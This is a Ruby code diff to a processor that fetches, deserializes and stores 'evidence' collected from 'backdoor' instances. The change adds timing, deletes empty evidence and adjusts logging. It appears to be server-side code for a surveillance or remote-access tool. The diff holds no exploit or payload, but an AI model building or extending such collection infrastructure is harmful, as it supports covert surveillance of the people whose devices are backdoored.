@@ -75,11 +75,19 @@ class InstanceProcessor
           
           begin
             # get evidence and deserialize it
+            start_time = Time.now
             data = RCS::EvidenceManager.get_evidence(evidence_id, @id)
             raise "Empty evidence" if data.nil?
             evidences = RCS::Evidence.new(@key).deserialize(data)
-            
+
             evidences.each do |evidence|
+
+              # delete empty evidences
+              if evidence.empty?
+                RCS::EvidenceManager.del_evidence(evidence_id, @id)
+                trace :debug, "deleted empty evidence for backdoor #{@id}"
+                next
+              end
               
               # store backdoor instance in evidence (used when storing into db)
               evidence.info[:instance] = @id
@@ -108,8 +116,9 @@ class InstanceProcessor
                     end
                   end
               end
-
-              trace :debug, "processed evidence #{evidence_id} of type #{evidence.info[:type]} (#{data.size.to_s_bytes}) for backdoor #{@id}"
+              
+              processing_time = Time.now - start_time
+              trace :info, "processed evidence #{evidence_id} of type #{evidence.info[:type]} (#{data.size.to_s_bytes}) for backdoor #{@id} [#{processing_time}s]"
             end
           
           rescue EvidenceDeserializeError => e
